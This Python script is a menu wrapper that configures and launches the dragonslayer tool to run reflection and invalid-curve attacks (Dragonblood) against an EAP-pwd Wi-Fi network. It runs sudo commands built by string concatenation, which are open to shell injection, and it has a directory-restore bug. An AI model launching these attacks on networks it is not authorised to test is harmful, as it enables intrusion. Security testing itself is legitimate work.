import sys
import os
import configparser
import subprocess as subprocess

def dragonMenu():
	print("1. Configure dragonslayer script")
	print("2. Check for reflection attack vulnerability")
	print("3. Check for invalid curve attack vulnerability")

def dragonInput(config):
	dragonMenu()
	command = input("> ")
	if command == "1":
		dragonConfigure(config)
	elif command == "2":
		reflectionAttack(config)
	elif command == "3":
		invalidCurveAttack(config)
	else:
		return

def dragonConfigure(config):
	#Read directory of dragonslayer from config
	dragonslayerDir = config["dragonblood"]["dragonslayerDir"]
	ssid = config["ap"]["ssid"]
	
	#Prompt user for required data
	print("Please enter a valid username for the network")
	user = input("> ")
	
	#Open dragonslayer config file
	path = dragonslayerDir + "/dragonslayer/client.conf"
	dsConfigFile = open(path, "w")
	
	#Write data to dragonslayer config file
	dsConfigFile.write("network={\n\tssid=\"" + ssid + "\"\n\tidentity=\"" + user +  
		"\"\n\n\tkey_mgmt=WPA-EAP\n\teap=PWD\n\tpassword=\"unknown password\"\n}")
	
	#Close dragonslayer config file
	dsConfigFile.close()

def reflectionAttack(config):
	#Read directory of dragonslayer from config
	dragonslayerDir = config["dragonblood"]["dragonslayerDir"]
	nic = config['host']['nic']
	
	#Get the current working directory
	currentDir = subprocess.run(['pwd'], capture_output=True, text=True).stdout
	
	#Move to the dragonslayer directory
	workingDir = dragonslayerDir + "/dragonslayer"
	os.chdir(workingDir)
	
	#Disable wifi
	cmd = "sudo service network-manager stop"
	os.system(cmd)
	
	#Enable dragonslayer to use wifi
	cmd = "sudo rfkill unblock wifi"
	os.system(cmd)
	
	#Issue command to attempt the invalid curve attack
	cmd = "sudo ./dragonslayer-client.sh -i " + nic + " -a 0"
	os.system(cmd)
	
	#Re-enable wifi
	cmd = "sudo service network-manager start"
	os.system(cmd)
	
	#Return to the current directory
	os.chdir(workingDir)

def invalidCurveAttack(config):
	#Read directory of dragonslayer from config
	dragonslayerDir = config["dragonblood"]["dragonslayerDir"]
	nic = config['host']['nic']
	
	#Get the current working directory
	currentDir = subprocess.run(['pwd'], capture_output=True, text=True).stdout
	
	#Move to the dragonslayer directory
	workingDir = dragonslayerDir + "/dragonslayer"
	os.chdir(workingDir)
	
	#Disable wifi
	cmd = "sudo service network-manager stop"
	os.system(cmd)
	
	#Enable dragonslayer to use wifi
	cmd = "sudo rfkill unblock wifi"
	os.system(cmd)
	
	#Issue command to attempt the invalid curve attack
	cmd = "sudo ./dragonslayer-client.sh -i " + nic + " -a 1 -dd"
	os.system(cmd)
	
	#Re-enable wifi
	cmd = "sudo service network-manager start"
	os.system(cmd)
	
	#Return to the current directory
	os.chdir(currentDir)
